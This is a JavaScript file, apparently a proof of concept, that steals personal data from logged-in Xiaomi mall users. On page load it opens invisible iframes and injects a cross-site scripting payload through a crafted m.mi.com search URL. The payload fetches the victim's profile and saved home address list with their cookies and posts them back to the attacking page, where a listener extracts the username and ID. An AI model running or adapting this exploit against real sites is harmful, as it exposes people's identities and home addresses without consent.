// 个人的家庭住址

function i(e) {
  if (Array.isArray(e)) return e
}
function n(e, t) {
  return i(e) || a(e, t) || r()
}
function r() {
  throw new TypeError('Invalid attempt to destructure non-iterable instance')
}
function a(e, t) {
  if (
    Symbol.iterator in Object(e) ||
    '[object Arguments]' === Object.prototype.toString.call(e)
  ) {
    var n = [],
      r = !0,
      a = !1,
      i = void 0
    try {
      for (
        var o, d = e[Symbol.iterator]();
        !(r = (o = d.next()).done) && (n.push(o.value), !t || n.length !== t);
        r = !0
      );
    } catch (s) {
      ;(a = !0), (i = s)
    } finally {
      try {
        r || null == d.return || d.return()
      } finally {
        if (a) throw i
      }
    }
    return n
  }
}

function formateXiaomiData(t) {
  if ('xiaomi' === t.data.source) {
    // 详细信息
    let r = t.data.d
    if (2 === r.length) {
      // 判断数据格式，并返回数据
      let a = n(r, 2)
      let i = a[0]
      let o = a[1]
      if (0 === i.code && 0 === o.code) {
        let d = i.data.user.userName
        let s = i.data.user.user_id
        let l = ''
        if (null != o.data) {
          try {
            console.log(o.data[0])

            //   let innerHTML = `
            //   <div class='item'>
            //     <p class='title'>新浪微博</p>
            //     <p>个人主页: ${data.weiboHomePage}</p>
            //     <p>图像: ${data.photo}</p>
            //     <p>用户名: ${data.userName}</p>
            //   </div>
            // `
            //   let dom = document.createElement('div')
            //   dom.innerHTML = innerHTML
            //   document.getElementById('content').appendChild(dom)
            console.log(object)
          } catch (g) {}
        }
      }
    }
  }
}

function xiaomi() {
  var e = document.createElement('iframe')
  e.width = 0
  e.height = 0
  e.style.borderWidth = 0
  e.src = 'https://m.mi.com/v1/authorize/relogin'
  e.onload = function () {
    var e = document.createElement('iframe')
    e.src =
      'https://m.mi.com/search/list?key=%27,location%3D%27javascript%3Aeval%5Cx28name%5Cx29%27,%27'
    e.width = 0
    e.height = 0
    e.style.borderWidth = 0
    e.name =
      'if (!!!window.a) {\n  window.a = true;\n  Promise.all(["https://m.mi.com/v1/user/index", "https://m.mi.com/v1/address/list"].map(url =>\n    fetch(url, {credentials: "include"}).then(resp => resp.json())))\n    .then(texts => {\n      let s = {source: \'xiaomi\', d: texts};\n      window.parent.postMessage(s, \'*\')\n    })\n} else {\n}'
    document.documentElement.appendChild(e)
  }
  document.documentElement.appendChild(e)
}
window.addEventListener('message', formateXiaomiData, !1)
// window.addEventListener('load', function () {
xiaomi()
// })
